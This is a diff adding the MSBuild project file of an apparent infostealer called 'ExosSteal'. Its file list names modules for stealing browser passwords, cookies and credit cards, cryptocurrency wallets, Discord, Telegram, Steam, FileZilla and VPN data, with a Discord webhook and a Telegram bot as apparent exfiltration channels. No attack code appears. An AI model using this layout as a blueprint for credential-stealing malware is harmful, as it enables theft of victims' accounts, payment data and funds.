@@ -1,0 +1,219 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{773AA003-B264-4974-B815-09C3992CC921}</ProjectGuid>
+    <OutputType>Exe</OutputType>
+    <RootNamespace>ExosSteal</RootNamespace>
+    <AssemblyName>ExosSteal</AssemblyName>
+    <TargetFrameworkVersion>v4.8</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
+    <Deterministic>true</Deterministic>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <ItemGroup>
+    <None Include="App.config" />
+    <None Include="obj\Debug\DesignTimeResolveAssemblyReferencesInput.cache" />
+    <None Include="obj\Debug\ExosSteal.csproj.AssemblyReference.cache" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="DiscordWebhook.cs" />
+    <Compile Include="exos.Bookmarks\Bookmarks.cs" />
+    <Compile Include="exos.Chromium\Autofill.cs" />
+    <Compile Include="exos.Chromium\Bookmarks.cs" />
+    <Compile Include="exos.Chromium\cAesGcm.cs" />
+    <Compile Include="exos.Chromium\cBCrypt.cs" />
+    <Compile Include="exos.Chromium\Cookies.cs" />
+    <Compile Include="exos.Chromium\CreditCards.cs" />
+    <Compile Include="exos.Chromium\Crypto.cs" />
+    <Compile Include="exos.Chromium\Downloads.cs" />
+    <Compile Include="exos.Chromium\History.cs" />
+    <Compile Include="exos.Chromium\Parser.cs" />
+    <Compile Include="exos.Chromium\Passwords.cs" />
+    <Compile Include="exos.Chromium\Recovery.cs" />
+    <Compile Include="exos.Cookies\Cookies.cs" />
+    <Compile Include="exos.Edge\Autofill.cs" />
+    <Compile Include="exos.Edge\Bookmarks.cs" />
+    <Compile Include="exos.Edge\CreditCards.cs" />
+    <Compile Include="exos.Edge\Recovery.cs" />
+    <Compile Include="exos.Firefox\Recovery.cs" />
+    <Compile Include="exos.History\History.cs" />
+    <Compile Include="exos.Passwords\Passwords.cs" />
+    <Compile Include="exos.Reflection\ReflectionUtils.cs" />
+    <Compile Include="exos.utils\Calc.cs" />
+    <Compile Include="exos.utils\GeoGet.cs" />
+    <Compile Include="exos\AES.cs" />
+    <Compile Include="exos\Armory.cs" />
+    <Compile Include="exos\AtomicWallet.cs" />
+    <Compile Include="exos\AutoFill.cs" />
+    <Compile Include="exos\Banking.cs" />
+    <Compile Include="exos\BitcoinCore.cs" />
+    <Compile Include="exos\Bookmark.cs" />
+    <Compile Include="exos\Browsers.cs" />
+    <Compile Include="exos\BrowserUtils.cs" />
+    <Compile Include="exos\BSSID.cs" />
+    <Compile Include="exos\Buffer.cs" />
+    <Compile Include="exos\Bytecoin.cs" />
+    <Compile Include="exos\cBrowserUtils.cs" />
+    <Compile Include="exos\cfg.cs" />
+    <Compile Include="exos\Cookie.cs" />
+    <Compile Include="exos\Counting.cs" />
+    <Compile Include="exos\CreditCard.cs" />
+    <Compile Include="exos\DashCore.cs" />
+    <Compile Include="exos\Decryptor.cs" />
+    <Compile Include="exos\Discord.cs" />
+    <Compile Include="exos\Electrum.cs" />
+    <Compile Include="exos\Ethereum.cs" />
+    <Compile Include="exos\Exodus.cs" />
+    <Compile Include="exos\Filemanager.cs" />
+    <Compile Include="exos\Files.cs" />
+    <Compile Include="exos\FileZilla.cs" />
+    <Compile Include="exos\GenStrings.cs" />
+    <Compile Include="exos\GetFiles.cs" />
+    <Compile Include="exos\Helper.cs" />
+    <Compile Include="exos\IFolders.cs" />
+    <Compile Include="exos\IJsonSerializerStrategy.cs" />
+    <Compile Include="exos\Jaxx.cs" />
+    <Compile Include="exos\Json.cs" />
+    <Compile Include="exos\JsonArray.cs" />
+    <Compile Include="exos\JsonObject.cs" />
+    <Compile Include="exos\LitecoinCore.cs" />
+    <Compile Include="exos\MainMenu.cs" />
+    <Compile Include="exos\Monero.cs" />
+    <Compile Include="exos\NordVPN.cs" />
+    <Compile Include="exos\Nss3.cs" />
+    <Compile Include="exos\OpenVPN.cs" />
+    <Compile Include="exos\Password.cs" />
+    <Compile Include="exos\Paths.cs" />
+    <Compile Include="exos\PocoJsonSerializerStrategy.cs" />
+    <Compile Include="exos\ProcessList.cs" />
+    <Compile Include="exos\Profile.cs" />
+    <Compile Include="exos\ProtonVPN.cs" />
+    <Compile Include="exos\Screen.cs" />
+    <Compile Include="exos\SimpleJson.cs" />
+    <Compile Include="exos\Site.cs" />
+    <Compile Include="exos\SQLite.cs" />
+    <Compile Include="exos\SqlReader.cs" />
+    <Compile Include="exos\StartWallets.cs" />
+    <Compile Include="exos\Steam.cs" />
+    <Compile Include="exos\SystemInfo.cs" />
+    <Compile Include="exos\Telegram.cs" />
+    <Compile Include="exos\URLSearcher.cs" />
+    <Compile Include="exos\Vime.cs" />
+    <Compile Include="exos\WinAPI.cs" />
+    <Compile Include="exos\Zcash.cs" />
+    <Compile Include="Ionic.Crc\CRC32.cs" />
+    <Compile Include="Ionic.Crc\CrcCalculatorStream.cs" />
+    <Compile Include="Ionic.Zip\AddOrUpdateAction.cs" />
+    <Compile Include="Ionic.Zip\AddProgressEventArgs.cs" />
+    <Compile Include="Ionic.Zip\BadCrcException.cs" />
+    <Compile Include="Ionic.Zip\BadPasswordException.cs" />
+    <Compile Include="Ionic.Zip\BadReadException.cs" />
+    <Compile Include="Ionic.Zip\BadStateException.cs" />
+    <Compile Include="Ionic.Zip\CloseDelegate.cs" />
+    <Compile Include="Ionic.Zip\ComHelper.cs" />
+    <Compile Include="Ionic.Zip\CompressionMethod.cs" />
+    <Compile Include="Ionic.Zip\CountingStream.cs" />
+    <Compile Include="Ionic.Zip\CryptoMode.cs" />
+    <Compile Include="Ionic.Zip\EncryptionAlgorithm.cs" />
+    <Compile Include="Ionic.Zip\ExtractExistingFileAction.cs" />
+    <Compile Include="Ionic.Zip\ExtractProgressEventArgs.cs" />
+    <Compile Include="Ionic.Zip\OffsetStream.cs" />
+    <Compile Include="Ionic.Zip\OpenDelegate.cs" />
+    <Compile Include="Ionic.Zip\ReadOptions.cs" />
+    <Compile Include="Ionic.Zip\ReadProgressEventArgs.cs" />
+    <Compile Include="Ionic.Zip\SaveProgressEventArgs.cs" />
+    <Compile Include="Ionic.Zip\SelfExtractorFlavor.cs" />
+    <Compile Include="Ionic.Zip\SelfExtractorSaveOptions.cs" />
+    <Compile Include="Ionic.Zip\SetCompressionCallback.cs" />
+    <Compile Include="Ionic.Zip\SfxGenerationException.cs" />
+    <Compile Include="Ionic.Zip\SharedUtilities.cs" />
+    <Compile Include="Ionic.Zip\WriteDelegate.cs" />
+    <Compile Include="Ionic.Zip\Zip64Option.cs" />
+    <Compile Include="Ionic.Zip\ZipCipherStream.cs" />
+    <Compile Include="Ionic.Zip\ZipConstants.cs" />
+    <Compile Include="Ionic.Zip\ZipContainer.cs" />
+    <Compile Include="Ionic.Zip\ZipCrypto.cs" />
+    <Compile Include="Ionic.Zip\ZipEntry.cs" />
+    <Compile Include="Ionic.Zip\ZipEntrySource.cs" />
+    <Compile Include="Ionic.Zip\ZipEntryTimestamp.cs" />
+    <Compile Include="Ionic.Zip\ZipErrorAction.cs" />
+    <Compile Include="Ionic.Zip\ZipErrorEventArgs.cs" />
+    <Compile Include="Ionic.Zip\ZipException.cs" />
+    <Compile Include="Ionic.Zip\ZipFile.cs" />
+    <Compile Include="Ionic.Zip\ZipInputStream.cs" />
+    <Compile Include="Ionic.Zip\ZipOption.cs" />
+    <Compile Include="Ionic.Zip\ZipOutput.cs" />
+    <Compile Include="Ionic.Zip\ZipOutputStream.cs" />
+    <Compile Include="Ionic.Zip\ZipProgressEventArgs.cs" />
+    <Compile Include="Ionic.Zip\ZipProgressEventType.cs" />
+    <Compile Include="Ionic.Zip\ZipSegmentedStream.cs" />
+    <Compile Include="Ionic.Zlib\Adler.cs" />
+    <Compile Include="Ionic.Zlib\BlockState.cs" />
+    <Compile Include="Ionic.Zlib\CompressionLevel.cs" />
+    <Compile Include="Ionic.Zlib\CompressionMode.cs" />
+    <Compile Include="Ionic.Zlib\CompressionStrategy.cs" />
+    <Compile Include="Ionic.Zlib\DeflateFlavor.cs" />
+    <Compile Include="Ionic.Zlib\DeflateManager.cs" />
+    <Compile Include="Ionic.Zlib\DeflateStream.cs" />
+    <Compile Include="Ionic.Zlib\FlushType.cs" />
+    <Compile Include="Ionic.Zlib\GZipStream.cs" />
+    <Compile Include="Ionic.Zlib\InflateBlocks.cs" />
+    <Compile Include="Ionic.Zlib\InflateCodes.cs" />
+    <Compile Include="Ionic.Zlib\InflateManager.cs" />
+    <Compile Include="Ionic.Zlib\InfTree.cs" />
+    <Compile Include="Ionic.Zlib\InternalConstants.cs" />
+    <Compile Include="Ionic.Zlib\InternalInflateConstants.cs" />
+    <Compile Include="Ionic.Zlib\ParallelDeflateOutputStream.cs" />
+    <Compile Include="Ionic.Zlib\SharedUtils.cs" />
+    <Compile Include="Ionic.Zlib\StaticTree.cs" />
+    <Compile Include="Ionic.Zlib\Tree.cs" />
+    <Compile Include="Ionic.Zlib\WorkItem.cs" />
+    <Compile Include="Ionic.Zlib\ZlibBaseStream.cs" />
+    <Compile Include="Ionic.Zlib\ZlibCodec.cs" />
+    <Compile Include="Ionic.Zlib\ZlibConstants.cs" />
+    <Compile Include="Ionic.Zlib\ZlibException.cs" />
+    <Compile Include="Ionic.Zlib\ZlibStream.cs" />
+    <Compile Include="Ionic.Zlib\ZlibStreamFlavor.cs" />
+    <Compile Include="Ionic\AttributesCriterion.cs" />
+    <Compile Include="Ionic\ComparisonOperator.cs" />
+    <Compile Include="Ionic\CompoundCriterion.cs" />
+    <Compile Include="Ionic\EnumUtil.cs" />
+    <Compile Include="Ionic\FileSelector.cs" />
+    <Compile Include="Ionic\LogicalConjunction.cs" />
+    <Compile Include="Ionic\NameCriterion.cs" />
+    <Compile Include="Ionic\SelectionCriterion.cs" />
+    <Compile Include="Ionic\SizeCriterion.cs" />
+    <Compile Include="Ionic\TimeCriterion.cs" />
+    <Compile Include="Ionic\TypeCriterion.cs" />
+    <Compile Include="Ionic\WhichTime.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="TelegramAPI\Bot.cs" />
+    <Compile Include="TelegramAPI\Telegram.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <Folder Include="obj\Debug\TempPE\" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
